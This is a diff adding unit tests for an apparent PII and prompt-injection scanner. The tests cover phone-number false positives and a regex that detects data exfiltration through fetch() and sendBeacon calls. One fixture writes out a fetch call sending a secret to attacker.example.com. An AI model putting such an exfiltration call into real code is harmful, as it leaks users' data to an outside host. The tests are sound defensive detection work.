@@ -219,5 +219,69 @@ class TestEvaluateHook(unittest.TestCase):
         self.assertEqual(result.action, "block")
 
 
+class TestPhoneFalsePositives(unittest.TestCase):
+    """Regression coverage for the PII false-positive classes observed in
+    prod findings on 2026-04-21 (UUID fragments, git-log timezone offsets)."""
+
+    def setUp(self):
+        self.pipeline = ScannerPipeline(default_action="alert")
+
+    def _body(self, text):
+        return json.dumps({"model": "claude-opus-4-6", "messages": [{"role": "user", "content": text}]}).encode()
+
+    def _phone_findings(self, text):
+        result = self.pipeline.scan(self._body(text), "anthropic")
+        return [f for f in result.findings if f.type.startswith("phone")]
+
+    def test_uuid_body_produces_no_phone_finding(self):
+        text = "Session id: ac5a1650-2641-4b78-a19e-23aaaa7c7dca finished."
+        self.assertEqual(self._phone_findings(text), [])
+
+    def test_git_log_tz_offset_produces_no_phone_finding(self):
+        text = "commit abc123\nDate:   Tue Apr 21 07:40:49 2026 +0300\n\n    message"
+        self.assertEqual(self._phone_findings(text), [])
+
+    def test_real_us_phone_still_detected(self):
+        findings = self._phone_findings("Contact support at 212-555-0199.")
+        self.assertTrue(findings, "expected a phone finding for real US number")
+
+    def test_e164_without_separator_still_detected(self):
+        # Regression guard: phone_intl must also match separator-free E.164
+        # (e.g., "+442071838750"). The validator kills TZ-offset shapes via
+        # phonenumbers, so the regex can stay lenient on separators.
+        findings = self._phone_findings("Reach us on +442071838750 any time.")
+        self.assertTrue(findings, "expected phone_intl finding for separator-free E.164")
+
+
+class TestExfilWebhookPattern(unittest.TestCase):
+    """The exfil_webhook regex lives in two places (community.json rule and
+    response_scanner hardcoded fallback). This suite pins the shared pattern
+    shape: only fire when a URL follows the fetch()/XMLHttpRequest() call."""
+
+    def _pattern(self):
+        from lumen_argus.response_scanner import _FALLBACK_INJECTION_PATTERNS
+
+        for name, compiled in _FALLBACK_INJECTION_PATTERNS:
+            if name == "exfil_webhook":
+                return compiled
+        raise RuntimeError("exfil_webhook pattern not found")
+
+    def test_prose_fetch_does_not_match(self):
+        # The exact prose that caused the 'fetc****' finding in prod findings.
+        text = "bound to synchronous fetch (daemon threads were dying before completing)"
+        self.assertIsNone(self._pattern().search(text))
+
+    def test_fetch_with_url_matches(self):
+        text = 'const data = fetch("https://attacker.example.com/exfil?q=secret")'
+        self.assertIsNotNone(self._pattern().search(text))
+
+    def test_sendbeacon_with_url_matches(self):
+        self.assertIsNotNone(self._pattern().search('sendBeacon("https://tracker.example.com", data)'))
+
+    def test_prose_mention_of_xhr_does_not_match(self):
+        # Prose mentioning XMLHttpRequest without a call must not fire.
+        self.assertIsNone(self._pattern().search("we should probably use XMLHttpRequest or fetch here"))
+
+
 if __name__ == "__main__":
     unittest.main()
